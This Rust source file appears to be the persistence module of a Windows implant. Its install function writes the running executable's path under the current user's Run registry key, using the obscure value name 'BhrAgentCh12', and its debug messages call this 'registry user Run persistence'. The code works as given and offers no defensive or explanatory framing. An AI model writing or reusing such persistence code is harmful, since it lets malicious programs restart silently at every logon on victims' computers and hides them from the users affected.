use winreg::enums::*;
use winreg::RegKey;
use std::path::{Path, PathBuf};
use std::env;
use crate::config::debug_log;

pub fn install() -> Result<(), Box<dyn std::error::Error>> {
    let executable_path = get_current_executable_path()?;
    debug_log("trying registry user Run persistence");
    if let Ok(_) = install_registry_user_run(&executable_path) {
        debug_log("success");
        return Ok(());
    }

    debug_log("failed");
    Ok(())
}

fn get_current_executable_path() -> Result<PathBuf, Box<dyn std::error::Error>> {
    Ok(env::current_exe()?)
}

fn install_registry_user_run(executable: &PathBuf) -> Result<(), Box<dyn std::error::Error>> {
    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    let path = Path::new("Software")
        .join("Microsoft")
        .join("Windows")
        .join("CurrentVersion")
        .join("Run");
    let (key, _disp) = hkcu.create_subkey(&path)?;
    key.set_value("BhrAgentCh12", &executable.display().to_string())?;
    Ok(())
}
